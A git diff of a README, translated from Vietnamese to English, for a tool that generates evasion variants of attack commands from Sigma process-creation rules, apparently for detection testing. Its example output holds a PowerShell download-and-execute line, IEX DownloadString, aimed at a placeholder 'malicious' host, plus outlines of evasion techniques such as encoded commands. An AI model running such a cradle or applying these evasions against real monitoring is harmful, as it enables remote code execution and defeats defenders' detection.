@@ -1,95 +1,111 @@
-# attack_convert/ – Evasion Command Generator Tool
+# 🛠️ Evasion Command Generator – `attack_convert/`
 
-Công cụ này giúp **tạo các lệnh tấn công gốc và né tránh (evasion)** từ các rule Sigma trong thư mục `process_creation`, dựa trên danh sách rule có thể bị bypass được định nghĩa trong `evasion_possible_rules.txt`.
+This tool is designed to **generate original and evasion attack commands** based on Sigma rules from the `process_creation` category. It supports five evasion techniques and exports the result in JSON format for further analysis or simulation.
 
 ---
 
-## Cấu trúc thư mục
+## 📁 Folder Structure
 
-```bash
+```json
 Sigma-automation/
 ├── attack_convert/
-│   ├── main.py                      # File chính để chạy
+│   ├── main.py                    # Entry point to generate evasion commands
 │   ├── utils/
-│   │   ├── parser.py                # Hàm trích xuất lệnh command
-│   │   ├── evasions_core.py         # Gom các evasion lại
+│   │   ├── parser.py              # Extracts command line from Sigma rule
+│   │   ├── evasions_core.py       # Main controller for all evasion techniques
 │   │   └── evasions/
-│   │       ├── insertion.py
-│   │       ├── substitution.py
-│   │       ├── omission.py
-│   │       ├── reordering.py
-│   │       └── recoding.py
+│   │       ├── insertion.py       # Evasion technique: Insertion
+│   │       ├── substitution.py    # Evasion technique: Substitution
+│   │       ├── omission.py        # Evasion technique: Omission
+│   │       ├── reordering.py      # Evasion technique: Reordering
+│   │       └── recoding.py        # Evasion technique: Recoding
 ```
 
 ---
 
-### Cách chạy
+## 🚀 How to Run
 
-#### 1. Chuẩn bị thư mục rule
+### 1. Prepare Input
 
-- Đặt các rule `.yml` tại:  
-  `data/rules/windows/process_creation/`
-- File chứa danh sách rule có thể bypass (tên không đổi):  
-  `evasion_possible_rules.txt`
-
-#### 2. Thiết lập `PYTHONPATH` và chạy
-
-##### Với Windows (CMD)
-
-```bash
-set PYTHONPATH=D:\...\Sigma-automation
-python -m attack_convert.main
-```
-
-##### Hoặc dùng PowerShell
-
-```bash
-$env:PYTHONPATH="D:\...\Sigma-automation"
-python -m attack_convert.main
-```
-
----
-
-### 📤 Kết quả
-
-- Kết quả sẽ được ghi vào thư mục:
+- Place all Sigma rule files (`.yml`) in:
 
   ```plaintext
-
-  attack_convert/Evasion-Results/
-
+  data/rules/windows/process_creation/
   ```
 
-- Mỗi file `.json` sẽ chứa:
-  - Lệnh tấn công gốc (`original_command`)
-  - 5 kỹ thuật né tránh (`insertion`, `substitution`, `omission`, `reordering`, `recoding`)
+- Create a file `evasion_possible_rules.txt` listing rules (by filename without `.yml`) that should be processed for evasion.
 
 ---
 
-### 💡 Ví dụ nội dung file kết quả
+### 2. Run the Tool
 
-```bash
+> From the **project root** (`Sigma-automation/`):
+
+#### Windows Command Prompt (CMD)
+
+```cmd
+set PYTHONPATH=D:\UIT\Nam_3\DACN\Sigma-automation
+python -m attack_convert.main
+```
+
+#### PowerShell
+
+```powershell
+$env:PYTHONPATH="D:\UIT\Nam_3\DACN\Sigma-automation"
+python -m attack_convert.main
+```
+
+---
+
+## 📤 Output
+
+- Generated files will be saved to:
+
+  ```plaintext
+  attack_convert/Evasion-Results/
+  ```
+
+- Each `.json` result includes:
+  - The original attack command
+  - Five evasion variations:
+    - `insertion`
+    - `substitution`
+    - `omission`
+    - `reordering`
+    - `recoding`
+
+---
+
+### 📄 Example Output
+
+```json
 {
   "rule_name": "suspicious_powershell_0",
   "original_command": "powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious')\"",
-  "evasions": 
-  {
-    "insertion": "powershell.exe -Command \"...\" # bypass",
-    "substitution": "powershell.exe -c \"...\"",
-    "omission": "powershell.exe \"...\"",
-    "reordering": "powershell.exe \"...\" -Command",
-    "recoding": "powershell.exe -EncodedCommand <base64>"
+  "evasions": {
+    "insertion": "powershell.exe -Command \"<obfuscated-inserted-command>\"",
+    "substitution": "powershell.exe -c \"<alias-used-command>\"",
+    "omission": "powershell.exe \"<command with removed parameters>\"",
+    "reordering": "powershell.exe \"<reordered arguments>\" -Command",
+    "recoding": "powershell.exe -EncodedCommand <base64-encoded-command>"
   }
 }
 ```
 
 ---
 
-### 🛠️ Yêu cầu
+## 📦 Requirements
 
-- Python 3.10 trở lên
-- Cài `pyyaml` nếu chưa có:
+- Python 3.10+
+- Install dependencies:
 
 ```bash
 pip install pyyaml
 ```
+
+---
+
+## ✅ Notes
+
+- Make sure your working directory is the **project root**, not inside `attack_convert/`.
+- `PYTHONPATH` must point to the root folder to allow relative imports.
